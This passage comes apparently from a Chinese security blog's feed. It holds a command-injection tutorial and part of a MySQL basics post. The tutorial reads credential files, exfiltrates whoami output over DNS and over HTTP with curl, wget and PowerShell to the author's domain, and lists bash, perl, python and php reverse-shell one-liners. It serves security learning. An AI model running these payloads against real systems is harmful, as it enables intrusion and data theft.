class=\"markdownIt-Anchor\" href=\"#多条命令执行\">#</a> <span class=\"label success\">多条命令执行</span></h4>\n<p><span class=\"kbd\">linux</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>分号 <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token punctuation\">;</span><span class=\"token variable\">`</span></span>：分号用于将多个命令按顺序连接在一起，不管前一个命令是否成功执行，都会继续执行下一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token punctuation\">;</span> command2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">ping</span> <span class=\"token number\">127.0</span>.0.1 <span class=\"token punctuation\">;</span> <span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>两条命令都会执行</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>双与号 <span class=\"token operator\">&amp;&amp;</span>： 双与号用于将多个命令连接在一起，只有前一个命令成功执行（返回退出状态码为0）时，才会继续执行下一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">&amp;&amp;</span> command2</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>双竖线 <span class=\"token operator\">||</span>： 双竖线用于将多个命令连接在一起，只有前一个命令未成功执行（返回退出状态码不为0）时，才会继续执行下一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">||</span> command2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpinyyt <span class=\"token number\">127.0</span>.0.1 <span class=\"token operator\">||</span> <span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>因为没有这个命令所以报错后面的ls将会执行</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>分号和 <span class=\"token operator\">&amp;</span>： 分号和 <span class=\"token operator\">&amp;</span> 结合在一起使用时，可以使命令在后台运行，而不会阻塞终端。这在需要运行长时间任务或定时任务时非常有用。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">&amp;</span> command2</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>反引号 <span class=\"token variable\"><span class=\"token variable\">`</span>： 反引号用于将命令的输出赋给变量。它允许您在命令中嵌套执行其他命令，并将结果存储在变量中。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token assign-left variable\">result</span><span class=\"token operator\">=</span><span class=\"token variable\">`</span></span>command1`</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>花括号 <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>： 花括号用于将多个命令分组在一起，以便可以在连接符的上下文中将多个命令视为一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span> command1 <span class=\"token punctuation\">;</span> command2 <span class=\"token punctuation\">;</span> command3 <span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><span class=\"kbd\">Windows</span></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&amp;</span>： 在 Windows 中，<span class=\"token operator\">&amp;</span> 符号用于连接多个命令，按顺序执行它们。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">&amp;</span> command2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">ping</span> <span class=\"token number\">127.0</span>.0.1 <span class=\"token operator\">&amp;</span> <span class=\"token function\">dir</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&amp;&amp;</span>： <span class=\"token operator\">&amp;&amp;</span> 符号用于连接多个命令，只有前一个命令成功执行（返回退出代码为0）时，才会继续执行下一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">&amp;&amp;</span> command2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">ping</span> <span class=\"token number\">127.0</span>.0.1 <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">dir</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t前面命令必须成功</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">||</span>： <span class=\"token operator\">||</span> 符号用于连接多个命令，只有前一个命令未成功执行（返回退出代码不为0）时，才会继续执行下一个命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">||</span> command2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>例如:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tpingyyy <span class=\"token number\">127.0</span>.0.1 <span class=\"token operator\">||</span> <span class=\"token function\">dir</span></pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">|</span>： 在 Windows 中，<span class=\"token operator\">|</span> 符号用于将一个命令的输出作为另一个命令的输入，实现管道操作。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 <span class=\"token operator\">|</span> command2</pre></td></tr></table></figure><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>^： 用于在 Windows 命令提示符中分行输入长命令，可以将 ^ 放在行尾来延续命令。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>command1 ^</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>command2</pre></td></tr></table></figure><h3 id=\"命令执行获取敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#命令执行获取敏感信息\">#</a> <span class=\"label info\">命令执行获取敏感信息</span></h3>\n<p>win 操作系统<br>\n type c:\\windows\\win.ini<br>\nlinux 操作系统<br>\n cat /etc/passwd</p>\n<h3 id=\"命令执行无回显\"><a class=\"markdownIt-Anchor\" href=\"#命令执行无回显\">#</a> <span class=\"label info\">命令执行无回显</span></h3>\n<h4 id=\"dns外带\"><a class=\"markdownIt-Anchor\" href=\"#dns外带\">#</a> <span class=\"label info\">DNS 外带</span></h4>\n<p><span class=\"label info\"><strong>win 命令</strong></span></p>\n<p>win 命令比较复杂</p>\n<p>for /F &quot;delims=&quot;  %i in (‘whoami’) do ping -n 1 %<span class=\"exturl\" data-url=\"aHR0cDovL2kubnNhbGdvZnltZC5kZ3JoMy5jbg==\">i.nsalgofymd.dgrh3.cn</span> (获得计算机名)</p>\n<p>for /F “delims=\\  tokens=2” %i in (‘whoami’) do ping -n 1 %<span class=\"exturl\" data-url=\"aHR0cDovL2kubnNhbGdvZnltZC5kZ3JoMy5jbg==\">i.nsalgofymd.dgrh3.cn</span>（获取用户名）</p>\n<ol>\n<li><code>for /F &quot;delims=\\&quot; %i in ('whoami')</code> ：这部分是一个  <code>for</code>  循环命令。它使用  <code>for</code>  命令来遍历  <code>whoami</code>  命令的输出，并将输出中的每一行（以反斜杠  <code>\\</code>  作为分隔符）分配给变量  <code>%i</code> 。</li>\n<li><code>do ping -n 1 %i.nsalgofymd.dgrh3.cn</code> ：一旦  <code>for</code>  循环遍历  <code>whoami</code>  的输出，它会执行  <code>do</code>  后的命令。在这个例子中，它执行了  <code>ping</code>  命令，试图将  <code>%i.nsalgofymd.dgrh3.cn</code>  的主机名解析为 IP 地址并发送一个 ICMP 回显请求（Ping）。</li>\n<li>这个命令的目的是通过执行  <code>whoami</code>  命令获取当前用户的信息，然后将这个信息用作主机名的一部分，然后尝试对这个构建的主机名进行 Ping 操作。</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ls.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ping.png\" alt=\"\"></p>\n<p><span class=\"label info\">linux</span></p>\n<p><code>ping -c 1 whoami.nsalgofymd.dgrh3.cn</code></p>\n<h4 id=\"写入文件\"><a class=\"markdownIt-Anchor\" href=\"#写入文件\">#</a> <span class=\"label info\">写入文件</span></h4>\n<p>可以通过 &gt; 把内容输入到文件里然后访问文件查看</p>\n<p>例如：</p>\n<p>​\t\twhoami &gt; admin</p>\n<p>然后浏览器访问这个文件<span class=\"exturl\" data-url=\"aHR0cDovL3h4eC54eHgueHh4L3h4eC9hZG1pbg==\"> http://xxx.xxx.xxx/xxx/admin</span></p>\n<h4 id=\"时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#时间盲注\">#</a> <span class=\"label info\">时间盲注</span></h4>\n<p>可以通过时间盲注跑数据借助 || &amp;&amp; 的惰性</p>\n<p>linux 使用 seelp 函数</p>\n<p>win 使用比较耗时间的 ping -n 5</p>\n<h4 id=\"http外带\"><a class=\"markdownIt-Anchor\" href=\"#http外带\">#</a> <span class=\"label info\">HTTP 外带</span></h4>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1odHRwZ3l6ZXJvLXBmMnB5cG8zOWJ2emVlOXFudXhvOWRlejliaW81ZG53NWIuc2hvcA==\">开一个 http 服务自己的域名 gyzero.shop</span></p>\n<p>linux 管道利用 wget,curl 进行数据外带会在服务器日志有记录如下</p>\n<p><code>ping -c 3curl gyzero.shop/ls</code></p>\n<p><code>ping -c 3wget gyzero.shop/$(id|base64)</code></p>\n<p>windows</p>\n<p>powershell 进行外带数据</p>\n<p><code>for /F %x in (echo 'zzzz') do powershell $b =</code></p>\n<p>[system.convert]::tobase64string(system.text.encoding)::utf-8.getbytes(‘%x’)):$b=new=object</p>\n<p><code>system.net.webclient;$b.downloadstring('http://gyzero.shop/httplig/'+$a);</code></p>\n<h3 id=\"反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell\">#</a> <span class=\"label info\">反弹 shell</span></h3>\n<p>远程服务器 nc 监听<br>\n nc -vlnp 8080</p>\n<p>受害者反弹 shell</p>\n<ul>\n<li>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</li>\n<li>perl -e 'use</li>\n<li>Socket;<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><mo>=</mo><mi mathvariant=\"normal\">&quot;</mi><mn>10.0.0.1</mn><mi mathvariant=\"normal\">&quot;</mi><mo separator=\"true\">;</mo></mrow><annotation encoding=\"application/x-tex\">i=&quot;10.0.0.1&quot;;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6595em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8889em;vertical-align:-0.1944em;\"></span><span class=\"mord\">&quot;10.0.0.1&quot;</span><span class=\"mpunct\">;</span></span></span></span>p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect( S,sockaddr_in(<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo separator=\"true\">,</mo><mi>i</mi><mi>n</mi><mi>e</mi><msub><mi>t</mi><mi>a</mi></msub><mi>t</mi><mi>o</mi><mi>n</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">p,inet_aton(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">in</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">t</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span></span></span></span>i)))){open(STDIN,“&gt;&amp;S”);open(STDOUT,“&gt;&amp;S”);open(STDERR,“&gt;&amp;S”);ex ec(“/bin/sh -i”);};’</li>\n<li>python -c 'import</li>\n<li>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1 &quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</li>\n<li>os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’</li>\n<li>php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/11/01/sqls/mysql/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/",
            "url": "http://gyzero.shop/2023/11/01/sqls/mysql/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/",
            "title": "mysql增删改查",
            "date_published": "2023-11-01T10:01:28.000Z",
            "content_html": "<h3 id=\"连接数据库\"><a class=\"markdownIt-Anchor\" href=\"#连接数据库\">#</a> <span class=\"label primary\">连接数据库</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>连接数据库</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">/</span>bin<span class=\"token comment\">#mysql -u root -p</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>password:</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>增 <span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> 数据库名字<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>结尾要加分号</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>查询数据库 <span class=\"token keyword\">show</span> databaes<span class=\"token punctuation\">;</span>查询所有数据库</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>查询指定数据库<span class=\"token keyword\">show</span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">database</span> 名字<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">use</span> 数据库名字 进入数据库</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>mysql注释符<span class=\"token string\">\"#\"</span>   <span class=\"token string\">\"/*123*/\"</span>  <span class=\"token string\">\" --\"</span></pre></td></tr></table></figure><h3 id=\"创建表\"><a class=\"markdownIt-Anchor\" href=\"#创建表\">#</a> <span class=\"label primary\">创建表</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>查看表结构 <span class=\"token keyword\">desc</span> <span class=\"token keyword\">table</span> 表名<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>查看表 <span class=\"token keyword\">desc</span> 表名；</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>查看当前数据库所有表 <span class=\"token keyword\">show</span> <span class=\"token keyword\">tables</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>创建表 <span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> <span class=\"token keyword\">if</span> <span class=\"token operator\">not</span> <span class=\"token keyword\">exists</span> GYusers <span class=\"token punctuation\">(</span>GYid <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">auto_increment</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                          users <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                          password <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                          email <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                          <span class=\"token keyword\">primary</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>GYid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                         <span class=\"token punctuation\">)</span><span class=\"token keyword\">engine</span><span class=\"token operator\">=</span>myisam <span class=\"token keyword\">default</span> <span class=\"token keyword\">charset</span><span class=\"token operator\">=</span>utf8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">auto_increment</span><span class=\"token punctuation\">(</span>定义列为自增的属性，一般用于主键，数值会自动加<span class=\"token number\">1</span>。<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token operator\">not</span> <span class=\"token boolean\">null</span>不可为<span class=\"token boolean\">null</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span> <span class=\"token punctuation\">(</span>关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">engine</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>选择数据库引擎<span class=\"token punctuation\">)</span>常见的数据库引擎 myisam<span class=\"token punctuation\">,</span><span class=\"token keyword\">InnoDB</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">charset</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>设置编码<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token operator\">not</span> <span class=\"token keyword\">exists</span><span class=\"token punctuation\">(</span>表示当相同的表名存在时，则不执行此创建语句，避免语句执行错误<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">default</span><span class=\"token punctuation\">(</span>为该属性设置默认值<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>通过命令提示符创建表</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> <span class=\"token keyword\">if</span> <span class=\"token operator\">not</span> <span class=\"token keyword\">exists</span> GYusers <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> GYid <span class=\"token keyword\">int</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span> <span class=\"token keyword\">auto_increment</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> users <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> password <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> email <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>GYid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token punctuation\">)</span><span class=\"token keyword\">engine</span><span class=\"token operator\">=</span>myisam <span class=\"token keyword\">default</span> <span class=\"token keyword\">charset</span><span class=\"token operator\">=</span>utf8<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Query OK<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token keyword\">rows</span> affected <span class=\"token punctuation\">(</span><span class=\"token number\">0.16</span> sec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mysql<span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"修改表的操作\"><a class=\"markdownIt-Anchor\" href=\"#修改表的操作\">#</a> <span class=\"label primary\">修改表的操作</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>删除表</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> 表名<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> gy_table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>修改表名</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> 旧表名 <span class=\"token keyword\">rename</span> 新表名；</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> gy_table <span class=\"token keyword\">rename</span> ar_table<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>修改字段名</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> 表名 CHANGE 旧属性名 新属性名 新数据类型<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> nasa change qqn qq <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>修改字段的数据类型</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> 表名 <span class=\"token keyword\">modify</span> 属性名 数据类型 修改字段的数据类型</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> nasa <span class=\"token keyword\">modify</span> password <span class=\"token keyword\">int</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>同时也可以修改可以为空不可以为空 加上<span class=\"token operator\">not</span> <span class=\"token boolean\">null</span>表示不可以为空 只有<span class=\"token boolean\">null</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>表示可以为空 不加就代表不修改</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>增加字段名</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> <span class=\"token keyword\">add</span> nasa qq <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">unsigned</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">unsigned</span><span class=\"token punctuation\">(</span>不允许有符号可以用做不能有负数<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> 表名 <span class=\"token keyword\">ADD</span> 属性名<span class=\"token number\">1</span> 数据类型 <span class=\"token punctuation\">[</span>完整性约束条件<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">FIRST</span> <span class=\"token operator\">|</span> <span class=\"token keyword\">AFTER</span> 属性名<span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>在某属性名后增加</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> users <span class=\"token keyword\">add</span> qq <span class=\"token keyword\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span>  <span class=\"token keyword\">after</span>  password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>在开头添加</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> users <span class=\"token keyword\">add</span> addres <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">not</span> <span class=\"token boolean\">null</span> <span class=\"token keyword\">first</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>删除字段</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> 表名 <span class=\"token keyword\">DROP</span> 属性名<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mysql<span class=\"token operator\">></span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> users <span class=\"token keyword\">drop</span> password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>更改表的存储引擎</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>格式：<span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> 表名 <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> 存储引擎名<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>mysql<span class=\"token operator\">></span> <span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> users <span class=\"token keyword\">engine</span><span class=\"token operator\">=</span><span class=\"token keyword\">InnoDB</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"增删改查\"><a class=\"markdownIt-Anchor\" href=\"#增删改查\">#</a> <span class=\"label primary\">增删改查</span></h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>增</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> users<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span>qq<span class=\"token punctuation\">,</span>email<span class=\"token 